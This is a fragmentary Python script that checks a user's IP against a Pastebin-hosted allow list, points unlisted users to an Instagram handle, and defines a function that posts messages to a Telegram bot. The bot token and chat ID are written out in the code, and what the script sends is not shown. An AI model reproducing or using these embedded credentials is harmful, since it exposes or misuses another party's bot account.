...
ip = active["ip"]
scan = requests.get("https://pastebin.com/raw/KGxb4vT1").text
if ip in scan:
    try:
    ...
    print(f"ip {ip} Not Activet Plz Call @_5wvd in Instagram");input();exit(0)
...
def checking_active_status():
    ...
    if 1:
        ...
        def sendtele(bot_message):
            bot_token = '5393476418:AAFuFKSiGNdJuGckxyMKXA5IgO9vIF0hhcQ'
            bot_chatID = '1746484069'
